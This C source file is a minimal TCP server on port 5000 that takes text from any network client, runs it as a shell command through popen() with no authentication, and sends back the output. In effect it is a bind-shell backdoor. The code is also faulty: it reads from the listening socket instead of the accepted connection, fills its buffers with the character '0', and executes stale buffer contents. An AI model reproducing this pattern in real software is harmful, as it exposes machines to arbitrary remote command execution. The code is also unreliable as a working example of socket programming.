#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>


int main() {
		int listenfd = 0, connfd = 0;
		int n;
		struct sockaddr_in serv_addr;

		char sendBuff[1024];
		char recvBuff[1024];

		listenfd = socket(AF_INET, SOCK_STREAM, 0);

		memset(&serv_addr, '0', sizeof(serv_addr));
		memset(&sendBuff,'0', sizeof(sendBuff));
		memset(&recvBuff,'0', sizeof(recvBuff));

		serv_addr.sin_family = AF_INET;
		serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		serv_addr.sin_port = htons(5000);

		bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
		listen(listenfd, 10);

		while(1) {
				connfd = accept(listenfd, (struct sockaddr*)NULL, NULL);

				while((n = read(listenfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
						recvBuff[n] = 0;
						if(fputs(recvBuff, stdout) == EOF)
								printf("\n Error: Fputs error\n");
				}

				FILE* file = popen(recvBuff, "r");
				fgets(sendBuff,sizeof(sendBuff),file);

				write(connfd,sendBuff,strlen(sendBuff));

				close(connfd);
				sleep(1);
		}
		return 0;
}
